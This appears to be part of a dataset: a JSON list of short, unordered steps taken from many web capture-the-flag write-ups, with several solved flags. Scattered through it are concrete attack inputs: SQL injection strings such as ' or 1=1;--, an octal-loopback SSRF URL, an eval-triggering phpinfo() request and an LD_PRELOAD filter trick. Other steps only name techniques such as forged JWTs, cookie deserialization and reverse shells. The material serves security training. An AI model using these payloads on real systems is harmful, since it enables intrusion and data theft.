    "Cycle between accounts due to 1 minute delay in database reset on new site",
    "Solved the challenge",
    "Received the URL and Docker file for the challenge.",
    "Analyze the code snippet",
    "Open http://easy-php.darkarmy.xyz/?lmao",
    "Modify the SQL command using the pattern 'SELECT id FROM users WHERE password = '' or 1=1;--' and username set as '123'.",
    "Identified that urllib.parse.urljoin can return the appended path as the base URL when handling malformed paths.",
    "Specify the target URL as 'http://0177.0.0.1/admin-status'.",
    "Check 'I agree Security Questions are Bad.' checkbox",
    "Identify 'eval' syntax on 'warmup' GET parameter.",
    "Levied MariaDB's support for the 'EXECUTE IMMEDIATE' command to run queries as strings.",
    "Upload the created file.",
    "Explored the site using ZAP Proxy.",
    "Notice that clicking on 'Facebook', 'Google' or 'Twitter' buttons attaches the note id and password to the shared URL.",
    "Notice that the SAFE_FOR_JQUERY flag is not being used.",
    "Perform serialization, encoding, and URL-encoding of the custom `Login` object.",
    "Overrode the 'window.enable_experimental_features' property.",
    "Successfully obtained the flag {you-have-to-eat-tomato-yume-chan!} as a result of the bypass.",
    "Identified the challenge.",
    "Identify the login process in the file bookhub/forms.user.py.",
    "If the content contains 'MCA{', print the content.",
    "Utilize object injection to manipulate 'mfa' and '_correctValue' variables to be equal.",
    "Access the site and find the flag.",
    "No flaws found in OTP verification logic.",
    "Injected an 'a' tag.",
    "Examine the /get endpoint.",
    "Began the CTF challenge.",
    "Used 'SetEnv LD_PRELOAD' to execute code when running gzip.",
    "$_COOKIE['login'] is deserialized",
    "Retrieve the flag from the refreshed webpage",
    "Recognize that this control can be used to exploit the vulnerability.",
    "Realize the need to request 'http://genflag/flag'.",
    "Referenced 'solv.py' file.",
    "Extract the configs.zip file.",
    "Used knowledge of these constraints to aim exploitation efforts at the more forgiving 'email' parameter.",
    "Return to the website.",
    "Observe the returned data.",
    "Created an XML HTTP request that references the /etc/flag.txt directory",
    "Identified that the user input '$text' from get param 'text' was being used.",
    "Observe that the service doesn't allow for file:// protocol.",
    "Test various SQL queries to deduce the type of database in use.",
    "Reverse-engineer the key using the ciphertext and original plaintext.",
    "Note what actions trigger the key's update.",
    "Split the large image data into three parts.",
    "Manipulate the 'accessGranted' attribute to bypass Access Denied error.",
    "Determined the position of the column used to return data, it was found to be the last one.",
    "Used the SQL injection.",
    "Analyze the code.",
    "Remove the 'noscript' tag.",
    "Decided to try sending a fake IP address in the headers.",
    "Obtain the payload generated by the exploit script.",
    "Derive a URL that starts with 32 bytes of hexadecimal characters using leading 0's.",
    "Extract the text before the period (.) from the Flask session cookie.",
    "Use the modified payload in the exploit.",
    "Grab the password.",
    "Performed the action of opening port 80.",
    "Use the obtained port number for the request.",
    "View files using the 'file://' protocol.",
    "Note that the token uses the RS256 algorithm",
    "Intend to inject a 'grep' command to look for the flag in the main.py file.",
    "Successfully extract the password token.",
    "Send request to /save.php.",
    "Discovered a column named 'whatsthis'.",
    "Log in to the website using the username 'jack' and the discovered password.",
    "Realized that this allows loading of a CSS file from the exploit domain.",
    "Navigate to /index.phps",
    "Analyze the Python code for the challenge.",
    "Identify the default value of 'false' for the 'isAdmin' field.",
    "Prepare a PATCH request for the new user\u2019s role.",
    "Used the value ':wq' for the 'exit' parameter.",
    "Identified possible injection vectors.",
    "Combined output filter.",
    "The JavaScript sends a POST request.",
    "Note the redirection to Google",
    "Attempted to open a reverse shell.",
    "Changed the payload to {'user':'admin'} using jwt.io",
    "Received an XPATH syntax error.",
    "Decide to exploit the type juggling scenario",
    "Included the new payload in the URL.",
    "Analyze how $$ variable is used in the code",
    "Realize the inability to send multi-line input using RESP protocol.",
    "Attempt basic payloads for NoSQL injection.",
    "Successfully accessed the '/debug/answer' endpoint.",
    "Discovered a suspicious 'data' parameter in the URL.",
    "Analyze the given Python script",
    "Receive a gif in response",
    "Inspect the code in the /redirect.",
    "Used a recent exploit.",
    "Construct an SQL injection query based on the format.",
    "Attempt to add the attacker's email to the admin's shared note.",
    "Identify the target port as port 11111",
    "Log in using new user_id and password",
    "Tried to become admin, but the server sent hints or funny responses",
    "Joined the two parts of the flag to form 'accessdenied{1_w3nt_thr0ugh_th1s_w3bs1t3}'",
    "Discover that the encryption function in PHP-Proxy is not secure",
    "Observe a login page with two authentication options: username and password, or WifiKey.",
    "Access the website hosting CTF.",
    "Isolate the '/' character.",
    "Create a Python script",
    "Conduct an extraction of the flag character by character.",
    "Highlighted 'ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip'.",
    "Enter a single apostrophe in the password field.",
    "Source code performs some validation.",
    "Include differing 'Content-Length' header values in the request",
    "Identify a value in Base64 within the cookie.",
    "Compare the response header with the chosen character",
    "Downloaded the flag.",
    "Input the SQL injection payload in the 'username' field as `username=admin&password=' or '1`.",
    "Identified the Content-Type.",
    "Ensure the completion of navigation and placement of the cookie by sleeping for 1 second.",
    "Repeat the loop until the total size exceeds 10 records.",
    "Start the burpsuite tool.",
    "Access the 'Support' section",
    "Recognize the opportunity that 'ping' sends a POST request when the link is clicked.",
    "Analyze JwtService.java.",
    "Found a response header",
    "Decide to switch 'astToJs' to 'evalCode'",
    "Note that only 'encoded_arr[0]' is known, and 'seed' is the actual character of 'msg' that we are trying to find.",
    "Test the character ']'",
    "Follow the provided link to the PHP-Proxy GitHub repository",
    "Printed the flag.",
    "Discover the existence of an admin login page",
    "Note that the execution of the PHP shell was unsuccessful",
    "Identify the requirement of same MD5 hash for the two PDFs.",
    "Trigger phpinfo() output by visiting 'http://easy-php.darkarmy.xyz/?bruh=phpinfo()&nic3=/DarkCON/e'",
    "Ensure that a valid graph can be created using a specific format",
    "Evaluate the object attribute and display it to the user",
    "Used leaked secret key",
    "Infer that payload modification is necessary to bypass security measures.",
    "The 'Mutation' query allows change of a user password.",
    "Retrieve the flag as confirmation of successful authentication.",
    "Noticed that an idea can be posted with an assigned ID.",
    "Set a 'flag' variable based on the response of the previous POST request.",
    "Received a request from the proxy server.",
    "Set the language headers to Swedish",
    "Used curl command",
    "Noticed that causing a TypeError triggers the 'require('./usage')'.",
    "Identified fields labeled 'username' and 'password'.",
    "Attempted the third web Gauntlet where the length requirement is reduced",
    "Started examining the Dockerfile provided.",
    "Identify that the re-writing and forwarding occurs when the `User-Agent` header is of the web crawlers.",
    "Tried a wrong HTTP verb.",
    "Make a POST request",
    "Connect to the website link (http://3.112.91.135/)",
    "Inject a double quote to break out of the alt tag.",
    "Gained a reverse shell by invoking the Lambda function",
    "Found a part of the flag: CHTB{",
    "Enter new user_id and password",
    "Utilized REST to discard png header from uploaded file",
    "Obtain the flag from the decoded string.",
    "Perform Insecure Direct Object Reference (IDOR)",
    "Identify that the source code is located at /src.tgz.",
    "Decide to add the base64-encoded serialized object as a 'login' cookie in the browser",
    "Craft another request and set the remote_addr to the required fake address.",
    "Determined the solution for the crossword puzzle.",
    "Access the application by logging in with the manipulated cookie to acquire the flag.",
    "Decode the ASCII representation to readable text using JavaScript console",
    "Discovered that `||` is the SQLite concatenation operator and is used to join strings together",
    "Use the ipaddress library in Python to check the IP address.",
    "Received flag indicating successful completion of challenge",
    "'database.js' lets you add and read items from the database. The query variable control is possible via the website, but SQL injection is unsuccessful.",
    "Accessed HTML source to find clues",
    "Submitting the generated token to retrieve the flag.",
    "Noticed that body-parser is set to allow arrays and objects",
    "Switch to a different IP address",
    "Access the login page.",
    "Through the request captured",
    "Executed './findaas flag.txt' command.",
    "Utilize the '/proc/self/' directory.",
    "Added debug prints to the file for the POST filename",
    "Name the cookie 'visited-main-page'.",
    "Examine the issued redirects",
    "Realize that the sha1 hashes of 'hash' and 'target' will not match.",
    "Add 'messi' as a key in the JSON object in the HTTP request.",
    "Acknowledged the increased challenge in analyzing the code",
    "Send a GET request to 'outer.html'",
    "Notice that 'mootools' JavaScript library is used.",
    "Successfully bypass the checks in the source code.",
    "Retrieved data from 'R34L_F14G' column in 'users_data' table."
]